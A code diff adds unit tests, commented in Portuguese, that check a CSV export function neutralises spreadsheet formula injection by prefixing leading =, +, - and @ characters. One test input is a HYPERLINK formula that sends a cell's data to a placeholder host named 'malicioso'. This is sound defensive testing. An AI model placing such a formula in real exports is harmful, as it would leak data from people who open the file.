@@ -21,6 +21,34 @@ const row = {
 };
 
 describe('toCsv', () => {
+  it('neutraliza fórmula de planilha na descrição (CSV injection)', () => {
+    // Sem o prefixo, o Excel executa a fórmula ao abrir o arquivo exportado.
+    const malicious = {
+      ...row,
+      description: '=HYPERLINK("http://malicioso/?d="&A2,"clique")',
+    };
+    const csv = toCsv([malicious]);
+    const line = csv.split('\r\n')[2];
+
+    expect(line).toContain(`"'=HYPERLINK`);
+    // A célula não começa com `=` (nem entre aspas): a fórmula não executa.
+    expect(line.split(';')[2]).not.toMatch(/^"?=/);
+  });
+
+  it('neutraliza também +, - e @ no início de qualquer campo', () => {
+    const csv = toCsv([{ ...row, category: '@SUM(A1:A9)', account: '-2+3' }]);
+    const line = csv.split('\r\n')[2];
+
+    expect(line).toContain("'@SUM(A1:A9)");
+    expect(line).toContain("'-2+3");
+  });
+
+  it('não altera texto normal', () => {
+    const csv = toCsv([{ ...row, description: 'Mercado do bairro' }]);
+
+    expect(csv.split('\r\n')[2]).toContain('Mercado do bairro');
+  });
+
   it('usa ponto e vírgula e a diretiva sep= para o Excel em pt-BR', () => {
     const csv = toCsv([row]);
     const [first, second] = csv.split('\r\n');
